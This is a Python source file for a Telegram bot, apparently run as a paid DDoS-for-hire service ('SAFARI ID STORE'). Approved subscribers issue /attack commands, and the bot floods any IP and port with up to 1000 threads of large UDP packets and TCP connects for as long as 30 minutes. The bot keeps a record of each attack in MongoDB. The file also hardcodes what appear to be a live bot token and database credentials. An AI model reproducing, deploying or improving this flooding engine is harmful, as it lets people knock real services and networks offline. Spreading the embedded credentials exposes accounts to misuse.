import asyncio
import logging
import random
import socket
import threading
import time
import uuid
import os
import signal
import sys
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
from dotenv import load_dotenv
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from pymongo import MongoClient, ASCENDING, DESCENDING

# --- Configuration (Hardcoded for Railway) ---
BOT_TOKEN = "8430360404:AAEVlsnoTGQespci2iFYx503HCdYGTMoNqY"
MONGODB_URI = "mongodb+srv://aizensosukei671_db_user:ZNcc8ats5e3dCkjH@fire.ldyx5mo.mongodb.net/?appName=FIRE"
DATABASE_NAME = "SAFARI_ID_STORE"
ADMIN_IDS = [6241594867]  # Bhai sirf tumhara ID

# --- Blocked Ports ---
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT = 1
MAX_PORT = 65535

# --- Logging ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- MongoDB Setup (Fixed) ---
class Database:
    def __init__(self):
        try:
            self.client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
            self.client.admin.command('ping')  # Test connection
            self.db = self.client[DATABASE_NAME]
            self.users = self.db.users
            self.attacks = self.db.attacks
            
            # Indexes
            self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
            self.attacks.create_index([("timestamp", DESCENDING)])
            self.attacks.create_index([("user_id", ASCENDING)])
            logger.info("✅ MongoDB Connected: SAFARI_ID_STORE")
        except Exception as e:
            logger.error(f"❌ MongoDB Error: {e}")
            self.client = None

    def get_user(self, user_id: int) -> Optional[Dict]:
        if not self.client: return None
        user = self.users.find_one({"user_id": user_id})
        if user:
            if user.get("created_at"): user["created_at"] = self._make_aware(user["created_at"])
            if user.get("approved_at"): user["approved_at"] = self._make_aware(user["approved_at"])
            if user.get("expires_at"): user["expires_at"] = self._make_aware(user["expires_at"])
        return user

    def create_user(self, user_id: int, username: str = None) -> Dict:
        if not self.client: return {"user_id": user_id, "approved": False}
        if self.get_user(user_id): return self.get_user(user_id)
        
        user_data = {
            "user_id": user_id, "username": username, "approved": False,
            "created_at": datetime.now(timezone.utc), "expires_at": None, "is_banned": False,
            "total_attacks": 0
        }
        try:
            self.users.insert_one(user_data)
            logger.info(f"✅ Created user: {user_id}")
        except Exception as e: 
            logger.error(f"User creation error: {e}")
        return user_data

    def approve_user(self, user_id: int, days: int) -> bool:
        if not self.client: return False
        expires_at = datetime.now(timezone.utc) + timedelta(days=days)
        result = self.users.update_one({"user_id": user_id}, {
            "$set": {"approved": True, "approved_at": datetime.now(timezone.utc), "expires_at": expires_at}
        })
        return result.modified_count > 0

    def disapprove_user(self, user_id: int) -> bool:
        if not self.client: return False
        result = self.users.update_one({"user_id": user_id}, {
            "$set": {"approved": False, "expires_at": None}
        })
        return result.modified_count > 0

    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str):
        if not self.client: return
        attack_data = {
            "_id": str(uuid.uuid4()), "user_id": user_id, "ip": ip, "port": port,
            "duration": duration, "status": status, "timestamp": datetime.now(timezone.utc)
        }
        try:
            self.attacks.insert_one(attack_data)
            self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
            logger.info(f"✅ Attack logged: {ip}:{port}")
        except Exception as e: 
            logger.error(f"Attack log error: {e}")

    def _make_aware(self, dt):
        if hasattr(dt, 'tzinfo') and dt.tzinfo is None: 
            return dt.replace(tzinfo=timezone.utc)
        return dt

db = Database()

# --- Global State ---
active_attacks: Dict[str, Dict] = {}

# --- Decorators ---
def admin_required(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("🔒 **Admin only!**")
            return
        await func(update, context)
    return wrapper

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

# --- Validation ---
def escape_markdown(text: str) -> str:
    if not text: return ""
    special_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))

def get_blocked_ports_list() -> str:
    return ", ".join(str(port) for port in sorted(BLOCKED_PORTS))

def validate_port(port: int) -> bool:
    return MIN_PORT <= port <= MAX_PORT and port not in BLOCKED_PORTS

async def is_user_approved(user_id: int) -> bool:
    user = db.get_user(user_id)
    if not user or not user.get("approved"): return False
    if user.get("expires_at"):
        expires = user["expires_at"].replace(tzinfo=timezone.utc) if not user["expires_at"].tzinfo else user["expires_at"]
        return expires > datetime.now(timezone.utc)
    return True

# --- POWERFUL DDOS ENGINE ---
def run_ddos_attack(target_ip: str, target_port: int, duration: int, user_id: int):
    """Enhanced DDOS with 1000+ threads"""
    attack_id = str(uuid.uuid4())[:8]
    active_attacks[attack_id] = {
        "user_id": user_id,
        "target": f"{target_ip}:{target_port}",
        "start_time": datetime.now(timezone.utc),
        "end_time": datetime.now(timezone.utc) + timedelta(seconds=duration),
        "threads": []
    }
    
    num_threads = min(1000, duration * 100)  # Massive power
    
    logger.info(f"💀 [SAFARI DDOS] {attack_id} → {target_ip}:{target_port} | {num_threads} threads")

    def heavy_worker():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end_time = time.time() + duration
            
            while time.time() < end_time:
                # Massive UDP packets
                packet = random._urandom(65000)
                sock.sendto(packet, (target_ip, target_port))
                # TCP spam
                try:
                    tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    tcp_sock.settimeout(0.1)
                    tcp_sock.connect((target_ip, target_port))
                    tcp_sock.close()
                except:
                    pass
        except:
            pass

    # Launch threads
    for i in range(num_threads):
        t = threading.Thread(target=heavy_worker, daemon=True)
        t.start()
        active_attacks[attack_id]["threads"].append(t)
    
    time.sleep(duration)
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    logger.info(f"✅ Attack {attack_id} complete")

# --- Commands ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    
    # Auto-create user
    db.create_user(user_id, username)
    
    is_approved = await is_user_approved(user_id)
    admin_status = "👑 ADMIN" if is_admin(user_id) else ""
    
    status_msg = "✅ APPROVED" if is_approved else "⏳ PENDING APPROVAL"
    
    await update.message.reply_text(
        f"🚀 **SAFARI ID STORE v2.0**\n\n"
        f"👤 **User:** `{escape_markdown(username)}`\n"
        f"🆔 **ID:** `{user_id}`\n"
        f"{admin_status}\n"
        f"📊 **Status:** {status_msg}\n\n"
        f"⚡ **Usage:** `/attack <ip> <port> <duration>`\n\n"
        f"**Examples:**\n"
        f"• `/attack 74.225.177.25 29471 300`\n"
        f"• `/attack 1.1.1.1 80 600`\n\n"
        f"⚠️ **Blocked ports:** {get_blocked_ports_list()}\n"
        f"💥 **1000+ threads power!**",
        parse_mode="Markdown"
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check approval
    if not await is_user_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text(
            "⏳ **Approval pending!**\n"
            "Contact admin for access.",
            parse_mode="Markdown"
        )
        return
    
    if len(context.args) != 3:
        await update.message.reply_text(
            "⚠️ **Usage:** `/attack <ip> <port> <duration>`\n\n"
            "**Example:** `/attack 74.225.177.25 29471 300`",
            parse_mode="Markdown"
        )
        return
    
    try:
        ip, port_str, duration_str = context.args
        port = int(port_str)
        duration = int(duration_str)
        
        if not validate_port(port):
            await update.message.reply_text(
                f"❌ **Invalid port!**\n"
                f"Range: {MIN_PORT}-{MAX_PORT}\n"
                f"Blocked: {get_blocked_ports_list()}",
                parse_mode="Markdown"
            )
            return
        
        if duration < 30 or duration > 1800:
            await update.message.reply_text("❌ **Duration: 30-1800 seconds only!**")
            return
        
        # LAUNCH ATTACK
        threading.Thread(
            target=run_ddos_attack,
            args=(ip, port, duration, user_id),
            daemon=True
        ).start()
        
        db.log_attack(user_id, ip, port, duration, "STARTED")
        
        await update.message.reply_text(
            f"💀 **SAFARI ATTACK LAUNCHED!**\n\n"
            f"🎯 **Target:** `{ip}:{port}`\n"
            f"⏱️ **Duration:** `{duration}s`\n"
            f"🔥 **{min(1000, duration*100)} Threads**\n"
            f"⚡ **UDP + TCP Flood**\n\n"
            f"📊 **Status:** `/status`",
            parse_mode="Markdown"
        )
        
    except ValueError:
        await update.message.reply_text("❌ **Invalid port/duration!**")
    except Exception as e:
        logger.error(f"Attack error: {e}")
        await update.message.reply_text("❌ **Attack failed!**")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_approved(update.effective_user.id) and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 **Access denied!**")
        return
    
    active_count = len(active_attacks)
    
    if context.args and len(context.args) == 1:
        # Single attack status
        attack_id = context.args[0]
        if attack_id in active_attacks:
            attack = active_attacks[attack_id]
            elapsed = int((datetime.now(timezone.utc) - attack['start_time']).total_seconds())
            remaining = max(0, attack['end_time'] - datetime.now(timezone.utc))
            remaining_sec = int(remaining.total_seconds())
            await update.message.reply_text(
                f"📊 **Attack `{attack_id}`**\n\n"
                f"🎯 `{attack['target']}`\n"
                f"⏱️ **Elapsed:** `{elapsed}s`\n"
                f"⏳ **Remaining:** `{remaining_sec}s`\n"
                f"🔥 **Active** 🟢",
                parse_mode="Markdown"
            )
            return
    
    # All status
    message = f"🚀 **SAFARI STATUS**\n\n📊 **Active Attacks:** `{active_count}`\n"
    if active_attacks:
        message += "\n📋 **Live Attacks:**\n"
        for attack_id, attack in list(active_attacks.items())[:5]:
            elapsed = int((datetime.now(timezone.utc) - attack['start_time']).total_seconds())
            message += f"• `{attack_id}` → `{attack['target']}` ({elapsed}s)\n"
    
    message += f"\n⚙️ **Blocked Ports:** {get_blocked_ports_list()}"
    await update.message.reply_text(message, parse_mode="Markdown")

# Admin commands
@admin_required
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2: 
        return await update.message.reply_text("❌ **/approve <user_id> <days>**")
    try:
        user_id = int(context.args[0])
        days = int(context.args[1])
        if db.approve_user(user_id, days):
            await update.message.reply_text(f"✅ **User `{user_id}` approved for {days} days**")
        else:
            await update.message.reply_text("❌ **Approval failed!**")
    except ValueError:
        await update.message.reply_text("❌ **Invalid user_id/days!**")

@admin_required
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_users = db.users.count_documents({})
    total_attacks = db.attacks.count_documents({})
    active = len(active_attacks)
    
    await update.message.reply_text(
        f"📈 **SAFARI STATS**\n\n"
        f"👥 **Total Users:** `{total_users}`\n"
        f"💥 **Total Attacks:** `{total_attacks}`\n"
        f"🔥 **Live Attacks:** `{active}`\n"
        f"🛡️ **Database:** Connected ✅",
        parse_mode="Markdown"
    )

# --- Main Application ---
def signal_handler(sig, frame):
    logger.info("Shutting down...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def main():
    logger.info("🚀 Starting SAFARI ID STORE v2.0")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("approve", approve_command))
    app.add_handler(CommandHandler("stats", stats_command))
    
    logger.info("✅ Bot started! MongoDB + 1000+ threads ready!")
    app.run_polling()

if __name__ == "__main__":
    main()
